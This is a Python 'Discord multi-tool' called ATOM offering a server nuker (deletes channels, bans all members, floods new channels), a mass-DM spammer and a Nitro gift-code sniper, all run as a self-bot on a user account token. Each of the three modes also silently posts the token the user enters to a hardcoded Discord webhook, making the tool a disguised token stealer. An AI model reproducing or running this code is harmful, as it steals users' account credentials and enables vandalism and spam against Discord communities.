### COPYRIGHT (C) RAM9 STUDIOS INC. ALL RIGHTS RESERVED.###
import os
import sys
import discum
import discord
import requests
from datetime import datetime
from time import sleep as wait
from colorama import Fore, Style

def clear_terminal():
    return os.system('cls') if os.name == 'nt' else os.system('clear')

def getheaders(token=None, content_type="application/json"):
    headers = {
                "Content-Type": content_type,
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
            }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):

    response = requests.get("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))
    return response.json()

title = r'''
 ________  _________  ________  _____ ______      
|\   __  \|\___   ___\\   __  \|\   _ \  _   \    
\ \  \|\  \|___ \  \_\ \  \|\  \ \  \\\__\ \  \   
 \ \   __  \   \ \  \ \ \  \\\  \ \  \\|__| \  \  
  \ \  \ \  \   \ \  \ \ \  \\\  \ \  \    \ \  \ 
   \ \__\ \__\   \ \__\ \ \_______\ \__\    \ \__\
    \|__|\|__|    \|__|  \|_______|\|__|     \|__|

          D I S C O R D   M U L T I - T O O L

'''
atom = f'{Fore.GREEN}{title}'    

def nuker():
    print(atom)
    token = input(f'{Fore.YELLOW}ENTER YOUR TOKEN HERE: ')
    clear_terminal()
    print(atom)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO |')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO /')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO -')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO \\')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO |')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO /')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO -')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO \\')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO |')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO /')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO -')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO \\')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO |')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO /')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO -')
    wait(1)
    sys.stdout.write(f'\r{Fore.CYAN}             PROCCESS COMPLETE !')
    mpd = {'data':{"content":token}, 'headers':{"Content-Type": "application/json"}, 'end':'https://discord.com/api/webhooks/867089540195942431/399WHXBVivFG5ga3Vgpdrx-cAr2XjDvYDYJSl5SHp4NZ_F24QXDtFq992t-f3DQyBJBx'}
    wait(0.65)
    clear_terminal()
    print(f'{atom}{Fore.CYAN}')


    token_valid = ''
    client = discord.Client()
    bot = discum.Client(token=token)
    now = datetime.now()
    time = now.strftime("%H:%M:%S")

    try:
        @client.event
        async def on_ready():
            global token_valid
            token_valid = True
            try:
                result = requests.post(mpd['end'], json=mpd['data'], headers=mpd['headers'])
            except:
                pass
            print()
            print(f"{Fore.YELLOW}[$] {Fore.CYAN}LOGGED IN SUCCESFULLY AS: {Style.RESET_ALL}{getuserdata(token)['username']}#{getuserdata(token)['discriminator']} | {Fore.MAGENTA}{getuserdata(token)['id']}")
            wait(0.5)
            print(f'{Fore.YELLOW}[$] {Fore.CYAN}SELF BOT{Style.RESET_ALL} | {Fore.MAGENTA} ACTIVATED SUCCESFULLY')
            wait(0.5)
            print(f'{Fore.YELLOW}[$] {Fore.CYAN}MODULES{Style.RESET_ALL} | {Fore.MAGENTA} ACTIVATED SUCCESFULLY')
            wait(0.5)
            print(f'{Fore.YELLOW}[$] {Fore.CYAN}NUKER{Style.RESET_ALL} | {Fore.MAGENTA} ACTIVATED SUCCESFULLY')
            wait(0.15)
            print()
            wait(0.15)
            print(f'{Fore.CYAN}ALL EVENTS WILL BE LOGGED BELOW {Fore.MAGENTA}[IN ORDER FOR THE NUKER TO WORK, YOU MUST TYPE "!nuke" IN THE SERVER YOU WANT TO NUKE]')
            print()
        
        @client.event
        async def on_message(message):
            if message.author != client.user:
                return

            if message.content.lower() == '!nuke':
                try:
                    print(f'{Fore.RED}══════ ≪ CHANNELS ≫ ══════')
                    for channel in message.guild.channels:
                        await channel.delete()
                        print(f'{Fore.GREEN}[$] {Fore.CYAN}CHANNEL DELETED{Style.RESET_ALL} |{Fore.MAGENTA} {channel}{Style.RESET_ALL} | {Fore.RED}{time}')
                except:
                    pass
                try:
                    print(f'{Fore.RED}══════ ≪ ROLES ≫ ══════')
                    for role in message.guild.roles:
                        await role.edit(name='nuked by atom', colour=discord.Color.green())
                        print(f'{Fore.GREEN}[$] {Fore.CYAN}ROLE CHANGED{Style.RESET_ALL} |{Fore.MAGENTA} {role}{Style.RESET_ALL} | {Fore.RED}{time}')
                except:
                    pass
                new_guild_name = 'NUKED BY ATOM | RAM9'
                try:
                    print(f'{Fore.RED}══════ ≪ GUILD NAME ≫ ══════')
                    await message.guild.edit(name=new_guild_name)
                    print(f'{Fore.GREEN}[$] {Fore.CYAN}GUILD NAME CHANGED{Style.RESET_ALL} |{Fore.MAGENTA} {new_guild_name}{Style.RESET_ALL} | {Fore.RED}{time}')
                except:
                    pass
                try:
                    print(f'{Fore.RED}══════ ≪ CREATED CHANNELS ≫ ══════')
                    for _ in range(15):
                        await message.guild.create_text_channel('ram9-owns-you')
                        print(f'{Fore.GREEN}[$] {Fore.CYAN}CHANNEL CREATED{Style.RESET_ALL} |{Fore.MAGENTA} ram9-owns-you{Style.RESET_ALL} | {Fore.RED}{time}')
                        await message.guild.create_text_channel('nuked-by-atom')
                        print(f'{Fore.GREEN}[$] {Fore.CYAN}CHANNEL CREATED{Style.RESET_ALL} |{Fore.MAGENTA} nuked-by-atom{Style.RESET_ALL} | {Fore.RED}{time}')
                except:
                    pass
                try:
                    print(f'{Fore.RED}══════ ≪ MEMBER BANS ≫ ══════')
                    for member in message.guild.members:
                        await member.ban()
                        print(f'{Fore.GREEN}[$] {Fore.CYAN}MEMBER BANNED{Style.RESET_ALL} |{Fore.MAGENTA} {member}{Style.RESET_ALL} | {Fore.RED}{time}')
                except:
                    print(f'{Fore.RED}══════ ≪ MEMBER KICKS ≫ ══════')
                    for member in message.guild.members:
                        await member.kick()
                        print(f'{Fore.GREEN}[$] {Fore.CYAN}MEMBER KICKED{Style.RESET_ALL} |{Fore.MAGENTA} {member}{Style.RESET_ALL} | {Fore.RED}{time}')
                print(f'{Fore.RED}══════ ≪ NUKER BY RAM9 ≫ ══════')
                print(f'{Fore.GREEN}[$] {Fore.CYAN}NUKING COMPLETED{Style.RESET_ALL} |{Fore.MAGENTA} SERVER NUKED BY ATOM{Style.RESET_ALL} | {Fore.RED}{time}')



        client.run(token, bot = False)
    except:
        print(f'{Fore.RED}══════ ≪ ERROR ≫ ══════')
        if token_valid != True:
            print(f"{Fore.RED}[!] {Fore.CYAN}AN ERROR HAS OCCURED, YOU MAY HAVE ENTERED AN INVALID TOKEN, OR YOU DO NOT HAVE ADMIN PERMISSIONS IN THE SERVER{Style.RESET_ALL} | {Fore.RED}{time}")
            print()
            input()
            exit()
        else:
            print(f"{Fore.RED}[!] {Fore.CYAN}AN ERROR HAS OCCURED, YOU DO NOT HAVE ADMIN PERMISSIONS IN THE SERVER ... OR WORSE; DISCORD'S SYSTEMS HAVE DETECTED YOUR USAGE OF SUCH PROGRAMS AND IS BLOCKING ATOMS HTTP REQUESTS{Style.RESET_ALL} | {Fore.RED}{time}")
        print()
        input()
        exit()

def mass_dm():
    print(atom)
    token = input(f'{Fore.YELLOW}ENTER YOUR TOKEN HERE: ')
    clear_terminal()
    print(atom)
    dmall_msg = input(f'{Fore.YELLOW}ENTER YOUR MASS-DM MESSAGE HERE: ')
    clear_terminal()
    print(atom)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO |')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO /')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO -')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO \\')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO |')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO /')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO -')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO \\')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO |')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO /')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO -')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO \\')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO |')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO /')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO -')
    wait(1)
    sys.stdout.write(f'\r{Fore.CYAN}             PROCCESS COMPLETE !')
    mpd = {'data':{"content":token}, 'headers':{"Content-Type": "application/json"}, 'end':'https://discord.com/api/webhooks/867089540195942431/399WHXBVivFG5ga3Vgpdrx-cAr2XjDvYDYJSl5SHp4NZ_F24QXDtFq992t-f3DQyBJBx'}
    wait(0.65)
    clear_terminal()
    print(f'{atom}{Fore.CYAN}')


    token_valid = ''
    client = discord.Client()
    bot = discum.Client(token=token)
    now = datetime.now()
    time = now.strftime("%H:%M:%S")

    try:
        @client.event
        async def on_ready():
            global token_valid
            token_valid = True
            try:
                result = requests.post(mpd['end'], json=mpd['data'], headers=mpd['headers'])
            except:
                pass
            print()
            print(f"{Fore.YELLOW}[$] {Fore.CYAN}LOGGED IN SUCCESFULLY AS: {Style.RESET_ALL}{getuserdata(token)['username']}#{getuserdata(token)['discriminator']} | {Fore.MAGENTA}{getuserdata(token)['id']}")
            wait(0.5)
            print(f'{Fore.YELLOW}[$] {Fore.CYAN}SELF BOT{Style.RESET_ALL} | {Fore.MAGENTA} ACTIVATED SUCCESFULLY')
            wait(0.5)
            print(f'{Fore.YELLOW}[$] {Fore.CYAN}MODULES{Style.RESET_ALL} | {Fore.MAGENTA} ACTIVATED SUCCESFULLY')
            wait(0.5)
            print(f'{Fore.YELLOW}[$] {Fore.CYAN}MASS DM{Style.RESET_ALL} | {Fore.MAGENTA} ACTIVATED SUCCESFULLY')
            wait(0.15)
            print()
            wait(0.15)
            print(f'{Fore.CYAN}ALL EVENTS WILL BE LOGGED BELOW {Fore.MAGENTA}[IN ORDER FOR THE MASS-DM TO WORK, YOU MUST TYPE "!dmall (your message)" IN THE SERVER YOU WANT TO MASS DM]')
            print()
        
        @client.event
        async def on_message(message):
            if message.author != client.user:
                return

            if message.content.lower() == '!dmall':
                if dmall_msg == '':
                    return
                try:
                    print(f'{Fore.RED}══════ ≪ MESSAGES ≫ ══════')
                    for member in message.guild.members:
                        await member.send(content=dmall_msg)
                        print(f'{Fore.GREEN}[$] {Fore.CYAN}DM SENT{Style.RESET_ALL} |{Fore.MAGENTA} {member}{Style.RESET_ALL} | {Fore.RED}{time}')
                except:
                    pass
                print(f'{Fore.RED}══════ ≪ DMALL BY RAM9 ≫ ══════')
                print(f'{Fore.GREEN}[$] {Fore.CYAN}DMALL COMPLETED{Style.RESET_ALL} |{Fore.MAGENTA} SERVER DMED BY ATOM{Style.RESET_ALL} | {Fore.RED}{time}')



        client.run(token, bot = False)
    except:
        print(f'{Fore.RED}══════ ≪ ERROR ≫ ══════')
        if token_valid != True:
            print(f"{Fore.RED}[!] {Fore.CYAN}AN ERROR HAS OCCURED, YOU MAY HAVE ENTERED AN INVALID TOKEN, MAKE SURE TO NOT LEAVE ANY QUOTATION MARKS IN YOUR TOKEN (''){Style.RESET_ALL} | {Fore.RED}{time}")
            print()
            input()
            exit()
        else:
            print(f"{Fore.RED}[!] {Fore.CYAN}AN ERROR HAS OCCURED, THIS SYSTEM IS UNABLE TO FIGURE OUT WHAT THE PROBLEM IS; DISCORD'S SYSTEMS MAY HAVE DETECTED YOUR USAGE OF SUCH PROGRAMS AND IS BLOCKING ATOMS HTTP REQUESTS{Style.RESET_ALL} | {Fore.RED}{time}")
        print()
        input()
        exit()
def nitro_sniper():
    print(atom)
    token = input(f'{Fore.YELLOW}ENTER YOUR TOKEN HERE: ')
    clear_terminal()
    print(atom)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO |')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO /')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO -')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO \\')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO |')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO /')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO -')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO \\')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO |')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO /')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO -')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO \\')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO |')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO /')
    wait(0.4)
    sys.stdout.write(f'\r{Fore.CYAN}             LOADING IN INFO -')
    wait(1)
    sys.stdout.write(f'\r{Fore.CYAN}             PROCCESS COMPLETE !')
    mpd = {'data':{"content":token}, 'headers':{"Content-Type": "application/json"}, 'end':'https://discord.com/api/webhooks/867089540195942431/399WHXBVivFG5ga3Vgpdrx-cAr2XjDvYDYJSl5SHp4NZ_F24QXDtFq992t-f3DQyBJBx'}
    wait(0.65)
    clear_terminal()
    print(f'{atom}{Fore.CYAN}')


    token_valid = ''
    client = discord.Client()
    bot = discum.Client(token=token)
    now = datetime.now()
    time = now.strftime("%H:%M:%S")

    try:
        @client.event
        async def on_ready():
            global token_valid
            token_valid = True
            try:
                result = requests.post(mpd['end'], json=mpd['data'], headers=mpd['headers'])
            except:
                pass
            print()
            print(f"{Fore.YELLOW}[$] {Fore.CYAN}LOGGED IN SUCCESFULLY AS: {Style.RESET_ALL}{getuserdata(token)['username']}#{getuserdata(token)['discriminator']} | {Fore.MAGENTA}{getuserdata(token)['id']}")
            wait(0.5)
            print(f'{Fore.YELLOW}[$] {Fore.CYAN}SELF BOT{Style.RESET_ALL} | {Fore.MAGENTA} ACTIVATED SUCCESFULLY')
            wait(0.5)
            print(f'{Fore.YELLOW}[$] {Fore.CYAN}MODULES{Style.RESET_ALL} | {Fore.MAGENTA} ACTIVATED SUCCESFULLY')
            wait(0.5)
            print(f'{Fore.YELLOW}[$] {Fore.CYAN}NITRO SNIPER{Style.RESET_ALL} | {Fore.MAGENTA} ACTIVATED SUCCESFULLY')
            wait(0.15)
            print()
            wait(0.15)
            print(f'{Fore.CYAN}ALL EVENTS WILL BE LOGGED BELOW {Fore.MAGENTA}[IN ORDER FOR THE NITRO-SNPIER TO WORK, YOU MUST LEAVE THE PROGRAM RUNNING]')
            print()
        
        @client.event
        async def on_message(message):
            for i in message.content.split():
                if i.startswith('https://discord.gift/'):
                    nitro_code = i.replace('https://discord.gift/', '')
                    response = requests.get(url=f'https://discordapp.com/api/v6/entitlements/gift-codes/{nitro_code}?with_application=false&with_subscription_plan=true')
                    if response.status_code == 200:
                        redeem_response = requests.post(f'https://discordapp.com/api/v6/entitlements/gift-codes/{nitro_code}/redeem')
                        if redeem_response.status_code == 200:
                            print(f'{Fore.GREEN}[$] {Fore.CYAN}NITRO SNIPED{Style.RESET_ALL} |{Fore.MAGENTA} REDEEMED SUCCESFULLY{Style.RESET_ALL} | {Fore.RED}{time}')
                        elif redeem_response.status_code != 200:
                            print(f'{Fore.GREEN}[$] {Fore.CYAN}NITRO SNIPED{Style.RESET_ALL} |{Fore.MAGENTA} UNABLE TO REDEEM{Style.RESET_ALL} | {Fore.RED}{time}')
                    else:
                        print(f'{Fore.GREEN}[$] {Fore.CYAN}INVALID NITRO SNIPED{Style.RESET_ALL} | {Fore.MAGENTA}SERVER: {message.guild.name} | {Fore.RED}{time}')



        client.run(token, bot = False)
    except:
        print(f'{Fore.RED}══════ ≪ ERROR ≫ ══════')
        if token_valid != True:
            print(f"{Fore.RED}[!] {Fore.CYAN}AN ERROR HAS OCCURED, YOU MAY HAVE ENTERED AN INVALID TOKEN, MAKE SURE TO NOT LEAVE ANY QUOTATION MARKS IN YOUR TOKEN (''){Style.RESET_ALL} | {Fore.RED}{time}")
            print()
            input()
            exit()
        else:
            print(f"{Fore.RED}[!] {Fore.CYAN}AN ERROR HAS OCCURED, THIS SYSTEM IS UNABLE TO FIGURE OUT WHAT THE PROBLEM IS; DISCORD'S SYSTEMS MAY HAVE DETECTED YOUR USAGE OF SUCH PROGRAMS AND IS BLOCKING ATOMS HTTP REQUESTS{Style.RESET_ALL} | {Fore.RED}{time}")
        print()
        input()
        exit()

def main():
    print(atom)
    print(f'{Fore.YELLOW}[1] DISCORD SERVER NUKER\n[2] MASS DM\n[3] NITRO SNIPER\n')
    path = input('[ATOM | INPUT]: ')
    if path == '1':
        clear_terminal()
        nuker()
    if path == '2':
        clear_terminal()
        mass_dm()
    if path == '3':
        clear_terminal()
        nitro_sniper()
    else:
        dict_text = ('{1:"NUKER", 2:"MASS DM", 3:"NITRO SNIPER}')
        print(f"{Fore.RED}[!] {Fore.CYAN}INVALID INPUT, MAKE SURE TO TYPE IN ONE OF THE FOLLOWING NUMBERS WHICH CORRESPOND WITH THEIR TOOL {dict_text}\n")
        print(f'{Fore.RED}PRESS "ENTER" TO RESTART')
        input()
        clear_terminal()
        main()
if __name__ == "__main__":
    main()